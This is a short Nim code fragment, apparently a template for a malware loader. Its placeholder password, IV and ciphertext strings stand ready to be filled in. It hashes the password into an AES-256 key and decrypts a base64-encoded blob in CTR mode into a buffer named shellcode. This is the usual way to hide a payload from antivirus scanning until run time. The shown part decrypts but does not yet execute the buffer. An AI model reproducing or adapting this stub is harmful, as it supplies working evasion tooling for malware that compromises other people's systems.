let
  password: string = "REPLACE_PASS"
  ivB64: string = "REPLACE_IV"
  encB64: string = "REPLACE_ENC"

var
  ctx: CTR[aes256]
  key: array[aes256.sizeKey, byte]
  iv: seq[byte] = toByteSeq(decode(ivB64))
  enc: seq[byte] = toByteSeq(decode(encB64))
  shellcode: seq[byte] = newSeq[byte](len(enc))

var expKey = sha256.digest(password)
copyMem(addr key[0], addr expKey.data[0], len(expKey.data))

ctx.init(key, iv)
ctx.decrypt(enc, shellcode)
ctx.clear()
